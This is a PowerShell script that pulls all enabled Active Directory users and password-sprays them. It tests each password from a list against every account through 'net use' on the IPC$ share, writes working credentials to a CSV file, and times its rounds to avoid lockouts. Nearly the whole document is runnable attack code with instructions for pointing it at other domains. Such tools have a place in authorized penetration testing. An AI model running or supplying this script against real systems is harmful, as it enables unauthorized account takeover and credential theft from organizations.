# Retrieve ADUsers and Password Spray Against Them

Import-Module ActiveDirectory

# Set errors to stop, this will prevent false positives in the password spray script
$ErrorActionPreference = 'Stop'

# Define output
$output = "c:\temp\output_" + (Get-Date -Format "MM-dd-yyyy") + ".csv." # This will be where working passwords are written

# Define password list (comment out line that you aren't using)
$passwords = get-content "c:\temp\passwords.txt" # Use a password list from a file
# $passwords = 'Summer2017','Fall2017','Winter2017','Spring2017' # define a password list to run from memory


# Set variables for domain
$computer = $env:COMPUTERNAME # If you are testing against another domain, change this to a domain connected machine 
$domain = $env:USERDOMAIN # If you are testing against another domain, change this to the domain name
$ou = "*OU=*" # If you only want to pull users from a specific OU

# Set sleep timer
$sleep = 15 * 60 # This is in seconds so 15 * 60 = 15 minutes. Only change the 15 value

# Do the lookup and create the output file (requires the machine you're running this from to be domain connected)
echo "AD-Lookup running, do not close window"
$users = Get-ADUser -filter {Enabled -eq $true} | Where-Object{$_.DistinguishedName -like $ou } | Select-Object SamAccountName

# Start password spraying
foreach($password in $passwords)
{ 
    foreach($user in $users)
    {
        $username = $user.SamAccountName
        echo "Running $password against $username" # comment this out to only see successful passwords

        # Try to connect to the IPC share using the password and user specified
        try
        {
            net use \\$computer\IPC$ /user:"$domain\$username" $password
            Add-Content $output "$username, $password" # comment this out to not write a file to disk
            net use /delete \\$computer\IPC$
            echo "Password Found! $username\$password"
        }
        catch{}
    }

    # Insert a sleep timer to not lock out domain accounts
    echo "Waiting for next run"
    Start-Sleep -Seconds $sleep
}

echo "Results written to $output"
